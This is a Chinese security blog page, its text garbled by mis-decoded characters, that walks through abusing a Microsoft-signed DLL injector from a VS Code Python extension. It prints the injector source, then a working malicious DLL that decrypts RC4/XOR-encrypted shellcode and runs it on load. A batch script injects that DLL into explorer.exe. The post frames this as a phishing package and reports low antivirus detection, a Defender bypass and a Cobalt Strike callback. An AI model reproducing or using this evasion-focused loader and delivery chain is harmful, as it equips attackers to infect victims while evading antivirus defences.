<!doctype html><html lang=zh dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>åŸºäºå·²ç­¾ådllæ³¨å…¥å™¨çš„dllæ³¨å…¥æœ¨é©¬ | 3lizabeth's Blog</title>
<meta name=keywords content="æœ¨é©¬,dllæ³¨å…¥"><meta name=description content="åˆ©ç”¨å·²æœ‰ç­¾åçš„dllæ³¨å…¥å™¨æ¥å¯¹ç›®æ ‡è¿›ç¨‹æ³¨å…¥æ¶æ„dllï¼Œæ‰§è¡Œæ¶æ„ä»£ç ã€‚"><meta name=author content="3lizabeth"><link rel=canonical href=http://3lizabeth.fun/posts/study/dll_inject1/><script async src=//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js></script><meta name=referrer content="no-referrer-when-downgrade"><link crossorigin=anonymous href=/assets/css/stylesheet.css rel="preload stylesheet" as=style><link rel=icon href=http://3lizabeth.fun/img/faye.jpg><link rel=icon type=image/png sizes=16x16 href=http://3lizabeth.fun/img/faye.jpg><link rel=icon type=image/png sizes=32x32 href=http://3lizabeth.fun/img/faye.jpg><link rel=apple-touch-icon href=http://3lizabeth.fun/faye.jpg><link rel=mask-icon href=http://3lizabeth.fun/faye.jpg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=zh href=http://3lizabeth.fun/posts/study/dll_inject1/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="åŸºäºå·²ç­¾ådllæ³¨å…¥å™¨çš„dllæ³¨å…¥æœ¨é©¬"><meta property="og:description" content="åˆ©ç”¨å·²æœ‰ç­¾åçš„dllæ³¨å…¥å™¨æ¥å¯¹ç›®æ ‡è¿›ç¨‹æ³¨å…¥æ¶æ„dllï¼Œæ‰§è¡Œæ¶æ„ä»£ç ã€‚"><meta property="og:type" content="article"><meta property="og:url" content="http://3lizabeth.fun/posts/study/dll_inject1/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-08-10T17:33:06+08:00"><meta property="article:modified_time" content="2024-08-10T17:33:06+08:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="åŸºäºå·²ç­¾ådllæ³¨å…¥å™¨çš„dllæ³¨å…¥æœ¨é©¬"><meta name=twitter:description content="åˆ©ç”¨å·²æœ‰ç­¾åçš„dllæ³¨å…¥å™¨æ¥å¯¹ç›®æ ‡è¿›ç¨‹æ³¨å…¥æ¶æ„dllï¼Œæ‰§è¡Œæ¶æ„ä»£ç ã€‚"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"ğŸ“šæ–‡ç« ","item":"http://3lizabeth.fun/posts/"},{"@type":"ListItem","position":2,"name":"ğŸ’»å­¦ä¹ ","item":"http://3lizabeth.fun/posts/study/"},{"@type":"ListItem","position":3,"name":"åŸºäºå·²ç­¾ådllæ³¨å…¥å™¨çš„dllæ³¨å…¥æœ¨é©¬","item":"http://3lizabeth.fun/posts/study/dll_inject1/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"åŸºäºå·²ç­¾ådllæ³¨å…¥å™¨çš„dllæ³¨å…¥æœ¨é©¬","name":"åŸºäºå·²ç­¾ådllæ³¨å…¥å™¨çš„dllæ³¨å…¥æœ¨é©¬","description":"åˆ©ç”¨å·²æœ‰ç­¾åçš„dllæ³¨å…¥å™¨æ¥å¯¹ç›®æ ‡è¿›ç¨‹æ³¨å…¥æ¶æ„dllï¼Œæ‰§è¡Œæ¶æ„ä»£ç ã€‚","keywords":["æœ¨é©¬","dllæ³¨å…¥"],"articleBody":"DLL æ³¨å…¥å¼æœ¨é©¬ è®¤è¯† DLLæ³¨å…¥å³é€šè¿‡æ³¨å…¥å™¨å‘æ­£åœ¨è¿è¡Œä¸­çš„ç¨‹åºæ³¨å…¥æ–°çš„DLLï¼Œä½¿å…¶è‡ªåŠ¨è°ƒç”¨è¯¥DLLä»è€Œè§¦å‘DLLä¸­çš„åŠŸèƒ½ã€‚DLLè¢«åŠ è½½åˆ°è¿›ç¨‹åä¼šè‡ªåŠ¨è¿è¡ŒDllMain()å‡½æ•°ï¼Œç”¨æˆ·å¯ä»¥æŠŠæƒ³æ‰§è¡Œçš„ä»£ç æ”¾åˆ°DllMain()å‡½æ•°ï¼Œæ¯å½“åŠ è½½DLLæ—¶ï¼Œæ·»åŠ çš„ä»£ç å°±ä¼šè‡ªç„¶è€Œç„¶å¾—åˆ°æ‰§è¡Œã€‚åˆ©ç”¨è¯¥ç‰¹æ€§å¯ä¿®å¤ç¨‹åºBug,æˆ–å‘ç¨‹åºæ·»åŠ æ–°åŠŸèƒ½ã€‚æ­£å¸¸å¸¸è§äºè°ƒè¯•ã€åŠŸèƒ½æ‹“å±•ã€è‡ªåŠ¨åŒ–ç­‰ï¼›ä½†è‹¥æ³¨å…¥æ¶æ„çš„DLLåˆ™å¯å¯¼è‡´ç¨‹åºæ‰§è¡Œæ”»å‡»è€…çš„æ¶æ„ä»£ç ã€‚\næœ¬ç¯‡æ–‡ç« æºè‡ªäºå€¾æ—‹å¤§ä½¬å¯¹vscode pythonè°ƒè¯•æ‹“å±•åŒ…å†…å«æœ‰çš„ä¸¤ä¸ªdllæ³¨å…¥å™¨ inject_dll_x86.exe ä¸inject_dll_amd64.exeçš„ç ”ç©¶ã€‚åœ¨è¯¥æ‹“å±•ä¸­ï¼Œè¿˜è‡ªå¸¦äº†è¯¥æ³¨å…¥å™¨çš„æºä»£ç ã€‚è¯¥dllæ³¨å…¥å™¨å·²ç»å¸¦æœ‰å¾®è½¯ä¸‰æ–¹ç»„ä»¶çš„ç­¾åï¼Œé€šè¿‡å¯¹è¯¥dllæ³¨å…¥å™¨çš„ç ”ç©¶ï¼Œå¯ä»¥å®ç°å¯¹åº”ç”¨çš„å…ç­¾dllæ³¨å…¥ã€‚\nå…¶å®è¯¥dllæ³¨å…¥å™¨åœ¨å„ç§pythonæ‹“å±•åŒ…ä¸­ä¹Ÿè‡ªå¸¦æœ‰ï¼Œæ¯”å¦‚æˆ‘çš„pycharm\næ‰“å¼€è·¯å¾„ï¼Œåœ¨åŒè·¯å¾„çš„windowsæ–‡ä»¶å¤¹é‡Œå¯æ‰¾åˆ°æºä»£ç inject_dll.cpp\næºä»£ç  inject_dll.cpp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 #include #include #include #include #include #include #pragma comment(lib, \"kernel32.lib\") #pragma comment(lib, \"user32.lib\") // Helper to free data when we leave the scope. class DataToFree { public: HANDLE hProcess; HANDLE snapshotHandle; LPVOID remoteMemoryAddr; int remoteMemorySize; DataToFree(){ this-\u003ehProcess = nullptr; this-\u003esnapshotHandle = nullptr; this-\u003eremoteMemoryAddr = nullptr; this-\u003eremoteMemorySize = 0; } ~DataToFree() { if(this-\u003ehProcess != nullptr){ if(this-\u003eremoteMemoryAddr != nullptr \u0026\u0026 this-\u003eremoteMemorySize != 0){ VirtualFreeEx(this-\u003ehProcess, this-\u003eremoteMemoryAddr, this-\u003eremoteMemorySize, MEM_RELEASE); this-\u003eremoteMemoryAddr = nullptr; this-\u003eremoteMemorySize = 0; } CloseHandle(this-\u003ehProcess); this-\u003ehProcess = nullptr; } if(this-\u003esnapshotHandle != nullptr){ CloseHandle(this-\u003esnapshotHandle); this-\u003esnapshotHandle = nullptr; } } }; /** * All we do here is load a dll in a remote program (in a remote thread). * * Arguments must be the pid and the dll name to run. * * i.e.: inject_dll.exe */ int wmain( int argc, wchar_t *argv[ ], wchar_t *envp[ ] ) { std::cout \u003c\u003c \"Running executable to inject dll.\" \u003c\u003c std::endl; // Helper to clear resources. DataToFree dataToFree; if(argc != 3){ std::cout \u003c\u003c \"Expected 2 arguments (pid, dll name).\" \u003c\u003c std::endl; return 1; } const int pid = _wtoi(argv[1]); if(pid == 0){ std::cout \u003c\u003c \"Invalid pid.\" \u003c\u003c std::endl; return 2; } const int MAX_PATH_SIZE_PADDED = MAX_PATH + 1; char dllPath[MAX_PATH_SIZE_PADDED]; memset(\u0026dllPath[0], '\\0', MAX_PATH_SIZE_PADDED); size_t pathLen = 0; wcstombs_s(\u0026pathLen, dllPath, argv[2], MAX_PATH); const bool inheritable = false; const HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, inheritable, pid); if(hProcess == nullptr || hProcess == INVALID_HANDLE_VALUE){ std::cout \u003c\u003c \"Unable to open process with pid: \" \u003c\u003c pid \u003c\u003c \". Error code: \" \u003c\u003c GetLastError() \u003c\u003c \".\" \u003c\u003c std::endl; return 3; } dataToFree.hProcess = hProcess; std::cout \u003c\u003c \"OpenProcess with pid: \" \u003c\u003c pid \u003c\u003c std::endl; const LPVOID remoteMemoryAddr = VirtualAllocEx(hProcess, nullptr, MAX_PATH_SIZE_PADDED, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); if(remoteMemoryAddr == nullptr){ std::cout \u003c\u003c \"Error. Unable to allocate memory in pid: \" \u003c\u003c pid \u003c\u003c \". Error code: \" \u003c\u003c GetLastError() \u003c\u003c \".\" \u003c\u003c std::endl; return 4; } dataToFree.remoteMemorySize = MAX_PATH_SIZE_PADDED; dataToFree.remoteMemoryAddr = remoteMemoryAddr; std::cout \u003c\u003c \"VirtualAllocEx in pid: \" \u003c\u003c pid \u003c\u003c std::endl; const bool written = WriteProcessMemory(hProcess, remoteMemoryAddr, dllPath, pathLen, nullptr); if(!written){ std::cout \u003c\u003c \"Error. Unable to write to memory in pid: \" \u003c\u003c pid \u003c\u003c \". Error code: \" \u003c\u003c GetLastError() \u003c\u003c \".\" \u003c\u003c std::endl; return 5; } std::cout \u003c\u003c \"WriteProcessMemory in pid: \" \u003c\u003c pid \u003c\u003c std::endl; const LPVOID loadLibraryAddress = (LPVOID) GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"LoadLibraryA\"); if(loadLibraryAddress == nullptr){ std::cout \u003c\u003c \"Error. Unable to get LoadLibraryA address. Error code: \" \u003c\u003c GetLastError() \u003c\u003c \".\" \u003c\u003c std::endl; return 6; } std::cout \u003c\u003c \"loadLibraryAddress: \" \u003c\u003c pid \u003c\u003c std::endl; const HANDLE remoteThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE) loadLibraryAddress, remoteMemoryAddr, 0, nullptr); if (remoteThread == nullptr) { std::cout \u003c\u003c \"Error. Unable to CreateRemoteThread. Error code: \" \u003c\u003c GetLastError() \u003c\u003c \".\" \u003c\u003c std::endl; return 7; } // We wait for the load to finish before proceeding to get the function to actually do the attach. std::cout \u003c\u003c \"Waiting for LoadLibraryA to complete.\" \u003c\u003c std::endl; DWORD result = WaitForSingleObject(remoteThread, 5 * 1000); if(result == WAIT_TIMEOUT) { std::cout \u003c\u003c \"WaitForSingleObject(LoadLibraryA thread) timed out.\" \u003c\u003c std::endl; return 8; } else if(result == WAIT_FAILED) { std::cout \u003c\u003c \"WaitForSingleObject(LoadLibraryA thread) failed. Error code: \" \u003c\u003c GetLastError() \u003c\u003c \".\" \u003c\u003c std::endl; return 9; } std::cout \u003c\u003c \"Ok, finished dll injection.\" \u003c\u003c std::endl; return 0; } ä»£ç å®ç°é€»è¾‘ ä¸»å‡½æ•°wmainæ¥æ”¶ä¸¤ä¸ªå‚æ•° pid ä¸ dll name ï¼Œå³æ³¨å…¥åº”ç”¨çš„pidä¸æ³¨å…¥çš„dllçš„è·¯å¾„\nè¿è¡Œåï¼Œä»£ç å°†ä½¿ç”¨OpenProcessæ‰“å¼€ç›®æ ‡è¿›ç¨‹ï¼Œä¸ºå…¶åˆ†é…(VirtualAllocEx)å¹¶å†™å…¥dllè·¯å¾„(WriteProcessMemory)è¿œç¨‹å†…å­˜ï¼›ç„¶åä½¿ç”¨kernel32.dllçš„LoadLibraryAå‡½æ•°è¿œç¨‹åŠ è½½dllï¼›æœ€ååˆ©ç”¨CreateRemoteThreadåˆ›å»ºè¿œç¨‹çº¿ç¨‹ï¼Œå…¥å£å³ä¸ºLoadLibraryAï¼Œä»¥åŠ è½½æŒ‡å®šdllï¼Œç„¶åç­‰å¾…å…¶è¿è¡Œå³å¯ï¼Œç›´è‡³å…¶çº¿ç¨‹å®Œæˆï¼Œé€šè¿‡WaitForSingleObjectç­‰å¾…å…¶ç»“æœã€‚å…¶ä¸­DataToTreeç±»çš„ææ„å‡½æ•°ä¼šåœ¨ç¨‹åºç»“æŸæˆ–é”™è¯¯æ—¶è‡ªåŠ¨é‡Šæ”¾æ‰€æœ‰èµ„æºï¼ŒåŒ…æ‹¬å…³é—­å¥æŸ„å’Œé‡Šæ”¾å†…å­˜ã€‚\næ³¨å…¥å™¨ä½¿ç”¨æ–¹å¼ è¯¥æ³¨å…¥å™¨ä½¿ç”¨åªéœ€ä¸¤ä¸ªå‚æ•°ï¼š\npid : ç›®æ ‡è¿›ç¨‹çš„è¿›ç¨‹ID dll name: æƒ³è¦æ³¨å…¥ç›®æ ‡è¿›ç¨‹çš„DLLç»å¯¹è·¯å¾„ æ»¥ç”¨æ€è·¯ é’“é±¼çš„æ—¶å€™å¯ä»¥å‘é€ä¸€ä¸ªBATæ‰¹å¤„ç†è„šæœ¬ã€dllæ³¨å…¥å™¨ã€dllæœ¨é©¬ BATæ‰¹å¤„ç†ï¼šè·å–x64è¿›ç¨‹çš„pid BATæ‰¹å¤„ç†ï¼šè·å–dllæœ¨é©¬ç»å¯¹è·¯å¾„ BATæ‰¹å¤„ç†ï¼šæ‰§è¡Œdllæ³¨å…¥å™¨ï¼Œå°†dllæœ¨é©¬æ³¨å…¥åˆ°ç›®æ ‡è¿›ç¨‹ä¸­ æ„é€ å¦‚å›¾æ‰€ç¤ºçš„å‹ç¼©åŒ…ï¼Œè§£å‹åå¾—åˆ°é’“é±¼æœ¨é©¬æ–‡ä»¶ï¼š ç¼–å†™dllæœ¨é©¬ ä¸ºäº†ä½¿æ¶æ„dllæ³¨å…¥è¿›äº†ç›®æ ‡è¿›ç¨‹åèƒ½è‡ªåŠ¨è¢«è°ƒç”¨ï¼Œåˆ™å°†æ¶æ„ä»£ç å†™å…¥dllmainä¸­ã€‚\næ€è·¯æ˜¯åœ¨å…¥å£ç‚¹æ‰§è¡Œå‡½æ•°ï¼Œç”³è¯·ä¸€ä¸ªæ–°çº¿ç¨‹ï¼Œç„¶åå¯åŠ¨æœ¨é©¬å‡½æ•°ï¼Œè¿›è¡Œshellcodeçš„è§£å¯†ä¸åŠ è½½ï¼Œç„¶åæœ‰åºå…³é—­å¥æŸ„å¹¶æ¸…ç†èµ„æºã€‚\ndllmain.cpp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 #include \"pch.h\" #include #include #include #include // é™æ€å˜é‡å’Œå¥æŸ„ static HANDLE hThread = NULL; static HANDLE hFile = INVALID_HANDLE_VALUE; const char* SHELLCODE_FILE = \"p64e.bin\"; const char* RC4_KEY = \"iC4n7'tHelpmYSe1f14ugh1n9\"; const char* XOR_KEY = \"411oFusd0n'tKn0wWh4t'sG01n90n!\"; // RC4è§£å¯† char* spellRC4(char* spell, int spellLength) { unsigned char S[256]; int i, j, x, y, t; char* ciphertext = new char[spellLength]; for (i = 0; i \u003c 256; i++) { S[i] = i; } j = 0; for (i = 0; i \u003c 256; i++) { j = (j + S[i] + RC4_KEY[i % strlen(RC4_KEY)]) % 256; std::swap(S[i], S[j]); } x = 0; y = 0; for (int k = 0; k \u003c spellLength; k++) { x = (x + 1) % 256; y = (y + S[x]) % 256; std::swap(S[x], S[y]); t = (S[x] + S[y]) % 256; ciphertext[k] = spell[k] ^ S[t]; } return ciphertext; } // XORè§£å¯† char* spellXOR(char* spell, int spellLength) { int keyLength = strlen(XOR_KEY); for (int i = 0; i \u003c spellLength; ++i) { spell[i] = spell[i] ^ XOR_KEY[i % keyLength]; } return spell; } // è§£å¯†å’Œæ‰§è¡Œå‡½æ•° void cast_spell_3(char* spell, int spellSize) { DWORD dwOldProtect; HANDLE HeapHandle = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, spellSize, 0); char* buf = (char*)HeapAlloc(HeapHandle, HEAP_ZERO_MEMORY, spellSize); //å †è°ƒç”¨ memcpy(buf, spell, spellSize); VirtualProtect(buf, spellSize, PAGE_EXECUTE, \u0026dwOldProtect); HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)buf, NULL, 0, NULL); WaitForSingleObject(hThread, INFINITE); } // DLLå¯¼å‡ºå‡½æ•°ï¼Œè¯»å–ã€è§£å¯†å’Œæ‰§è¡Œshellcode extern \"C\" __declspec(dllexport) void RunShellcode() { std::ifstream spellfile(SHELLCODE_FILE, std::ios::in | std::ios::binary); spellfile.seekg(0, std::ios::end); int length = spellfile.tellg(); spellfile.seekg(0, std::ios::beg); char* spelldata = new char[length]; spellfile.read(spelldata, length); spellfile.close(); spelldata = spellRC4(spelldata, length); spelldata = spellXOR(spelldata, length); cast_spell_3(spelldata, length); delete[] spelldata; } // çº¿ç¨‹å‡½æ•° DWORD WINAPI ThreadProc(LPVOID lpParameter) { RunShellcode(); return 0; } // æ¸…ç†èµ„æºå‡½æ•° void CleanupResources() { if (hFile != INVALID_HANDLE_VALUE) { CloseHandle(hFile); hFile = INVALID_HANDLE_VALUE; } } // DLLå…¥å£ç‚¹ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: hThread = CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL); if (hThread == NULL) { std::cerr \u003c\u003c \"Error creating thread: \" \u003c\u003c GetLastError() \u003c\u003c std::endl; return FALSE; } break; case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: if (hThread != NULL) { WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); hThread = NULL; } CleanupResources(); break; } return TRUE; } é™æ€å…æ€æ€è·¯å°±æ˜¯shellcodeåˆ†ç¦»ä¸åŠ å¯†ï¼Œæ‰€ä»¥éœ€è¦åŒæ­¥é…ç½®ä¸€ä¸ªp64e.binæ–‡ä»¶\nbatè„šæœ¬å®ç°æ³¨å…¥ é“¾æ¥ç”Ÿæˆdllåï¼Œä½¿ç”¨batè„šæœ¬è¿›è¡Œæ³¨å…¥ã€‚æ³¨å…¥åŸºæœ¬æ€è·¯æ˜¯\nè·å–x64è¿›ç¨‹çš„pid è·å–dllæœ¨é©¬ç»å¯¹è·¯å¾„ æ‰§è¡Œdllæ³¨å…¥å™¨ï¼Œå°†dllæœ¨é©¬æ³¨å…¥åˆ°ç›®æ ‡è¿›ç¨‹ä¸­ runme.bat 1 2 3 4 5 6 7 8 9 10 @echo off setlocal set \"target_process_name=explorer.exe\" set \"dll_name=Loader.dll\" set \"injecter=inject_dll_amd64.exe\" for /f \"tokens=2\" %%i in ('tasklist ^| findstr /i \"%target_process_name%\"') do set \"pid=%%i\" set \"command=%CD%\\%injecter% %pid% %CD%\\%dll_name%\" :: å¤„ç†å¼•å· æ‰§è¡Œ \"%CD%\\%injecter%\" %pid% \"%CD%\\%dll_name%\" æµ‹è¯•ç»“æœ dll VTæ£€æµ‹ç»“æœ 2/75 æ³¨å…¥notepad.exeï¼Œç»•è¿‡ df ä¸Šçº¿ cs å¼¹å‡ºè®¡ç®—å™¨ ä¹Ÿèƒ½æ³¨å…¥explorer.exeï¼Œä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯æ³¨å…¥ä¸€æ¬¡è¿‡åï¼Œéœ€è¦é‡å¯æ‰èƒ½æ³¨å…¥ç¬¬äºŒæ¬¡ã€‚\ncredicts https://payloads.online/archivers/2023-09-08/vscode-dll/\n","wordCount":"2483","inLanguage":"zh","datePublished":"2024-08-10T17:33:06+08:00","dateModified":"2024-08-10T17:33:06+08:00","author":[{"@type":"Person","name":"3lizabeth"}],"mainEntityOfPage":{"@type":"WebPage","@id":"http://3lizabeth.fun/posts/study/dll_inject1/"},"publisher":{"@type":"Organization","name":"3lizabeth's Blog","logo":{"@type":"ImageObject","url":"http://3lizabeth.fun/img/faye.jpg"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://3lizabeth.fun/ accesskey=h title="3lizabeth's Blog (Alt + H)">3lizabeth's Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://3lizabeth.fun/search title="ğŸ”æœç´¢ (Alt + /)" accesskey=/><span>ğŸ”æœç´¢</span></a></li><li><a href=http://3lizabeth.fun/ title=ğŸ ä¸»é¡µ><span>ğŸ ä¸»é¡µ</span></a></li><li><a href=http://3lizabeth.fun/posts title=ğŸ“šæ–‡ç« ><span>ğŸ“šæ–‡ç« </span></a></li><li><a href=http://3lizabeth.fun/archive title=â±æ—¶é—´è½´><span>â±æ—¶é—´è½´</span></a></li><li><a href=http://3lizabeth.fun/categories title=ğŸ§©åˆ†ç±»><span>ğŸ§©åˆ†ç±»</span></a></li><li><a href=http://3lizabeth.fun/tags title=ğŸ”–æ ‡ç­¾><span>ğŸ”–æ ‡ç­¾</span></a></li><li><a href=http://3lizabeth.fun/about title=ğŸ™‹ğŸ»â€â™‚ï¸å…³äº><span>ğŸ™‹ğŸ»â€â™‚ï¸å…³äº</span></a></li><li><a href=http://3lizabeth.fun/links title=ğŸ¤æˆ‘åšç±³><span>ğŸ¤æˆ‘åšç±³</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=http://3lizabeth.fun/>ğŸ ä¸»é¡µ</a>&nbsp;Â»&nbsp;<a href=http://3lizabeth.fun/posts/>ğŸ“šæ–‡ç« </a>&nbsp;Â»&nbsp;<a href=http://3lizabeth.fun/posts/study/>ğŸ’»å­¦ä¹ </a></div><h1 class="post-title entry-hint-parent">åŸºäºå·²ç­¾ådllæ³¨å…¥å™¨çš„dllæ³¨å…¥æœ¨é©¬</h1><div class=post-description>åˆ©ç”¨å·²æœ‰ç­¾åçš„dllæ³¨å…¥å™¨æ¥å¯¹ç›®æ ‡è¿›ç¨‹æ³¨å…¥æ¶æ„dllï¼Œæ‰§è¡Œæ¶æ„ä»£ç ã€‚</div><div class=post-meta><span title='2024-08-10 17:33:06 +0800 CST'>2024-08-10</span>&nbsp;Â·&nbsp;5 åˆ†é’Ÿ&nbsp;Â·&nbsp;3lizabeth</div><div class=meta-item>&nbspÂ·&nbsp
	  <span id=busuanzi_container_page_pv>æœ¬æ–‡é˜…è¯»é‡<span id=busuanzi_value_page_pv></span>æ¬¡</span></div></header><aside id=toc-container class="toc-container wide"><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>ç›®å½•</span></summary><div class=inner><ul><li><a href=#dll-%e6%b3%a8%e5%85%a5%e5%bc%8f%e6%9c%a8%e9%a9%ac aria-label="DLL æ³¨å…¥å¼æœ¨é©¬">DLL æ³¨å…¥å¼æœ¨é©¬</a><ul><li><a href=#%e8%ae%a4%e8%af%86 aria-label=è®¤è¯†>è®¤è¯†</a></li><li><a href=#%e6%ba%90%e4%bb%a3%e7%a0%81 aria-label=æºä»£ç >æºä»£ç </a><ul><li><a href=#inject_dllcpp aria-label=inject_dll.cpp><code>inject_dll.cpp</code></a></li></ul></li><li><a href=#%e4%bb%a3%e7%a0%81%e5%ae%9e%e7%8e%b0%e9%80%bb%e8%be%91 aria-label=ä»£ç å®ç°é€»è¾‘>ä»£ç å®ç°é€»è¾‘</a></li><li><a href=#%e6%b3%a8%e5%85%a5%e5%99%a8%e4%bd%bf%e7%94%a8%e6%96%b9%e5%bc%8f aria-label=æ³¨å…¥å™¨ä½¿ç”¨æ–¹å¼>æ³¨å…¥å™¨ä½¿ç”¨æ–¹å¼</a></li><li><a href=#%e6%bb%a5%e7%94%a8%e6%80%9d%e8%b7%af aria-label=æ»¥ç”¨æ€è·¯>æ»¥ç”¨æ€è·¯</a></li><li><a href=#%e7%bc%96%e5%86%99dll%e6%9c%a8%e9%a9%ac aria-label=ç¼–å†™dllæœ¨é©¬>ç¼–å†™dllæœ¨é©¬</a><ul><li><a href=#dllmaincpp aria-label=dllmain.cpp><code>dllmain.cpp</code></a></li></ul></li><li><a href=#bat%e8%84%9a%e6%9c%ac%e5%ae%9e%e7%8e%b0%e6%b3%a8%e5%85%a5 aria-label=batè„šæœ¬å®ç°æ³¨å…¥>batè„šæœ¬å®ç°æ³¨å…¥</a><ul><li><a href=#runmebat aria-label=runme.bat><code>runme.bat</code></a></li></ul></li><li><a href=#%e6%b5%8b%e8%af%95%e7%bb%93%e6%9e%9c aria-label=æµ‹è¯•ç»“æœ>æµ‹è¯•ç»“æœ</a><ul><li><a href=#dll-vt%e6%a3%80%e6%b5%8b%e7%bb%93%e6%9e%9c-275 aria-label="dll VTæ£€æµ‹ç»“æœ 2/75">dll VTæ£€æµ‹ç»“æœ 2/75</a></li><li><a href=#%e6%b3%a8%e5%85%a5notepadexe%e7%bb%95%e8%bf%87-df-%e4%b8%8a%e7%ba%bf-cs-%e5%bc%b9%e5%87%ba%e8%ae%a1%e7%ae%97%e5%99%a8 aria-label="æ³¨å…¥notepad.exeï¼Œç»•è¿‡ df ä¸Šçº¿ cs å¼¹å‡ºè®¡ç®—å™¨">æ³¨å…¥<code>notepad.exe</code>ï¼Œç»•è¿‡ df ä¸Šçº¿ cs å¼¹å‡ºè®¡ç®—å™¨</a></li></ul></li><li><a href=#credicts aria-label=credicts>credicts</a></li></ul></li></ul></div></details></div></aside><script>let activeElement,elements;window.addEventListener("DOMContentLoaded",function(){checkTocPosition(),elements=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]"),activeElement=elements[0];const t=encodeURI(activeElement.getAttribute("id")).toLowerCase();document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active")},!1),window.addEventListener("resize",function(){checkTocPosition()},!1),window.addEventListener("scroll",()=>{activeElement=Array.from(elements).find(e=>{if(getOffsetTop(e)-window.pageYOffset>0&&getOffsetTop(e)-window.pageYOffset<window.innerHeight/2)return e})||activeElement,elements.forEach(e=>{const t=encodeURI(e.getAttribute("id")).toLowerCase();e===activeElement?document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active"):document.querySelector(`.inner ul li a[href="#${t}"]`).classList.remove("active")})},!1);const main=parseInt(getComputedStyle(document.body).getPropertyValue("--article-width"),10),toc=parseInt(getComputedStyle(document.body).getPropertyValue("--toc-width"),10),gap=parseInt(getComputedStyle(document.body).getPropertyValue("--gap"),10);function checkTocPosition(){const e=document.body.scrollWidth;e-main-toc*2-gap*4>0?document.getElementById("toc-container").classList.add("wide"):document.getElementById("toc-container").classList.remove("wide")}function getOffsetTop(e){if(!e.getClientRects().length)return 0;let t=e.getBoundingClientRect(),n=e.ownerDocument.defaultView;return t.top+n.pageYOffset}</script><div class=post-content><h2 id=dll-æ³¨å…¥å¼æœ¨é©¬>DLL æ³¨å…¥å¼æœ¨é©¬<a hidden class=anchor aria-hidden=true 